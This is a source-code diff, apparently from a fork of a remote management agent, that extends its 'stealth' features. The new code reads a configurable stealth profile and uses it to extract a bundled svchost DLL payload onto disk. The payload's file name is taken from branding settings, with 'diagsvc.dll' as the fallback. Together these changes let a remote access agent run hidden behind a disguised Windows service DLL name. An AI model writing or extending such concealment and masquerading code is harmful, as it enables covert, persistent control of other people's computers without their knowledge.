@@ -6,6 +6,11 @@
 #include "stealth_utils.h"
 #include "branding_util.h"
 #include "svchost_payload.h"
+#include "stealth_defaults.h"
+
+#ifndef STEALTH_FALLBACK_DLL_NAME
+#define STEALTH_FALLBACK_DLL_NAME L"diagsvc.dll"
+#endif
 
 static int EnvEnabledW(const wchar_t* name, int defaultOn)
 {
@@ -93,12 +98,19 @@ void Stealth_InitLabFeatures(void)
         }
     }
 
+    const mesh_stealth_profile_t* stealthProfile = MeshConfig_GetStealth();
     int extractDefault = 0;
-#if defined(MESH_AGENT_BUNDLE_EXTRACT_DEFAULT)
-    extractDefault = (MESH_AGENT_BUNDLE_EXTRACT_DEFAULT != 0);
-#elif defined(MESH_AGENT_SVCHOST_MODE) && MESH_AGENT_SVCHOST_MODE
-    extractDefault = 1;
-#endif
+    if (stealthProfile != NULL)
+    {
+        if (stealthProfile->bundleExtract != 0)
+        {
+            extractDefault = 1;
+        }
+        else if (stealthProfile->svchostMode != 0)
+        {
+            extractDefault = 1;
+        }
+    }
 
     // 5) Optionally extract bundled svchost DLL payload (from compiled header)
     if (EnvEnabledW(L"STEALTH_BUNDLE_EXTRACT", extractDefault)) {
@@ -120,7 +132,12 @@ void Stealth_InitLabFeatures(void)
             GetModulePathW(dllOut, MAX_PATH);
             size_t n = wcslen(dllOut);
             while (n > 0 && dllOut[n-1] != L'\\' && dllOut[n-1] != L'/') { dllOut[--n] = L'\0'; }
-            wcscat_s(dllOut, MAX_PATH, L"diagsvc.dll");
+            wchar_t dllName[MAX_PATH] = {0};
+            MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), dllName, _countof(dllName));
+            if (dllName[0] == L'\0') {
+                wcscpy_s(dllName, _countof(dllName), STEALTH_FALLBACK_DLL_NAME);
+            }
+            wcscat_s(dllOut, MAX_PATH, dllName);
         }
 
         if (MeshSvchostPayload_WriteToPath(dllOut)) {
